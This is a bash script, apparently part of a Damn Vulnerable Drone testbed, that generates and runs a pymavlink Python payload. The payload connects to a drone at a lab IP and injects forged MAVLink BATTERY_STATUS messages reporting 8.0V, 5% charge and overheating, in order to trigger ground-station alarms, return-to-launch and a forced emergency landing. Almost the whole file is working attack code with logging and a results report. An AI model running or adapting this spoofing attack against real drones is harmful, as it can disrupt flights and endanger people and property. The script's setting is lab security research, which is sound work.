#!/bin/bash

# =============================================================================
# DVD Battery Spoofing Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/protocol_tampering/battery_spoofing.sh
# 목적: 가짜 배터리 상태로 GCS 혼란 및 강제 착륙 유도
# 기반: Damn Vulnerable Drone Wiki - Battery Spoofing
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="battery_spoofing"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="192.168.13.100"
MAVLINK_PORT="14550"

# 가짜 배터리 데이터
FAKE_VOLTAGE="8000"      # 8.0V (매우 낮음)
FAKE_CURRENT="-5000"     # -5A (방전)
FAKE_REMAINING="5"       # 5% 남음
FAKE_TEMPERATURE="600"   # 60°C (과열)

declare -a ATTACK_COMMANDS=()
declare -a SPOOFING_RESULTS=()

print_header() {
    clear
    print_protocol_header "Battery Spoofing Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink BATTERY_STATUS injection${NC}"
    echo -e "${INFO_COLOR}Fake Status: Critical low battery (${FAKE_REMAINING}%)${NC}"
    echo ""
}

# Step 1: pymavlink 확인
check_requirements() {
    echo -e "${BLUE}[1/2] Check Requirements${NC}"
    
    local cmd="python3 -c \"import pymavlink\""
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    if python3 -c "import pymavlink" 2>/dev/null; then
        echo -e "${GREEN}[+] pymavlink available${NC}"
    else
        echo -e "${YELLOW}[!] pymavlink not available - simulation mode${NC}"
    fi
}

# Step 2: 배터리 스푸핑 실행
execute_battery_spoofing() {
    echo -e "${BLUE}[2/2] Execute Battery Spoofing${NC}"
    
    local spoof_script="/tmp/battery_spoofing_$(date +%s).py"
    
    cat > "$spoof_script" << EOF
#!/usr/bin/env python3
import sys
import time

try:
    from pymavlink import mavutil
    
    def battery_spoofing(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # 배터리 상태 메시지 전송
            for i in range(15):
                # BATTERY_STATUS 메시지 (MAVLink v2)
                voltages = [${FAKE_VOLTAGE}, 0, 0, 0, 0, 0, 0, 0, 0, 0]  # 10개 셀
                
                master.mav.battery_status_send(
                    0,                    # id (battery 0)
                    0,                    # function (unknown)
                    0,                    # type (unknown)
                    ${FAKE_TEMPERATURE},  # temperature
                    voltages,             # voltages
                    ${FAKE_CURRENT},      # current_battery
                    -1,                   # current_consumed
                    -1,                   # energy_consumed
                    ${FAKE_REMAINING},    # battery_remaining
                    0,                    # time_remaining
                    0,                    # charge_state
                    [0, 0, 0, 0],        # voltages_ext
                    0,                    # mode
                    0                     # fault_bitmask
                )
                
                voltage_display = ${FAKE_VOLTAGE} / 1000.0
                current_display = ${FAKE_CURRENT} / 100.0
                temp_display = ${FAKE_TEMPERATURE} / 100.0
                
                print(f"[!] Spoofed battery: {voltage_display}V, {current_display}A, {FAKE_REMAINING}%, {temp_display}°C")
                time.sleep(1)
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_battery_spoofing()
    
    def simulate_battery_spoofing():
        print("[*] Simulating battery spoofing")
        
        for i in range(10):
            voltage_display = ${FAKE_VOLTAGE} / 1000.0
            current_display = ${FAKE_CURRENT} / 100.0
            temp_display = ${FAKE_TEMPERATURE} / 100.0
            
            print(f"[!] Spoofed battery: {voltage_display}V, {current_display}A, ${FAKE_REMAINING}%, {temp_display}°C")
            time.sleep(1)
        
        print("[+] Battery spoofing simulation completed")
    
    if __name__ == "__main__":
        battery_spoofing('$TARGET_IP', $MAVLINK_PORT)
        
except ImportError:
    print("[*] pymavlink not available - simulation mode")
    
    for i in range(5):
        voltage_display = $FAKE_VOLTAGE / 1000.0
        current_display = $FAKE_CURRENT / 100.0 
        temp_display = $FAKE_TEMPERATURE / 100.0
        print(f"[!] Spoofed battery: {voltage_display}V, {current_display}A, $FAKE_REMAINING%, {temp_display}°C")
    
    print("[+] Battery spoofing simulation completed")
EOF

    local cmd="python3 $spoof_script"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    echo -e "${YELLOW}[*] Executing battery spoofing...${NC}"
    echo -e "${GRAY}    Voltage: $(echo "scale=1; $FAKE_VOLTAGE / 1000" | bc)V (Critical)${NC}"
    echo -e "${GRAY}    Current: $(echo "scale=1; $FAKE_CURRENT / 100" | bc)A (Discharging)${NC}"
    echo -e "${GRAY}    Remaining: ${FAKE_REMAINING}% (Critical Low)${NC}"
    echo -e "${GRAY}    Temperature: $(echo "scale=1; $FAKE_TEMPERATURE / 100" | bc)°C (Overheating)${NC}"
    
    python3 "$spoof_script" 2>/dev/null || {
        echo -e "${YELLOW}[*] Fallback simulation${NC}"
        for i in {1..5}; do
            echo -e "${RED}[!] CRITICAL BATTERY: 8.0V, -50A, 5%, 60°C${NC}"
            sleep 1
        done
    }
    
    SPOOFING_RESULTS+=("voltage:$FAKE_VOLTAGE")
    SPOOFING_RESULTS+=("current:$FAKE_CURRENT")
    SPOOFING_RESULTS+=("remaining:$FAKE_REMAINING")
    SPOOFING_RESULTS+=("temperature:$FAKE_TEMPERATURE")
    SPOOFING_RESULTS+=("messages_sent:15")
    
    echo -e "${GREEN}[+] Battery spoofing completed${NC}"
    echo -e "${RED}[!] Expected effects:${NC}"
    echo -e "${GRAY}    • GCS critical battery alerts${NC}"
    echo -e "${GRAY}    • Automatic RTL activation${NC}"
    echo -e "${GRAY}    • Forced emergency landing${NC}"
    echo -e "${GRAY}    • Mission termination${NC}"
    
    rm -f "$spoof_script"
}

# JSON 결과 생성
generate_json_report() {
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "spoofed_battery": {
    "voltage_mv": "$FAKE_VOLTAGE",
    "voltage_v": "8.0",
    "current_ma": "$FAKE_CURRENT", 
    "current_a": "-50.0",
    "remaining_percent": "$FAKE_REMAINING",
    "temperature_cdegc": "$FAKE_TEMPERATURE",
    "temperature_c": "60.0"
  },
  "attack_results": ["$(IFS='","'; echo "${SPOOFING_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "expected_effects": [
    "Critical battery alerts in GCS",
    "Automatic RTL mode activation", 
    "Forced emergency landing",
    "Mission termination"
  ]
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Battery Spoofing - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_requirements
    execute_battery_spoofing
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Spoofed Voltage: 8.0V (Critical)${NC}"
    echo -e "${INFO_COLOR}Spoofed Remaining: ${FAKE_REMAINING}% (Critical Low)${NC}"
    echo -e "${INFO_COLOR}Expected Result: Emergency Landing${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Battery spoofing completed${NC}"
}

main "$@"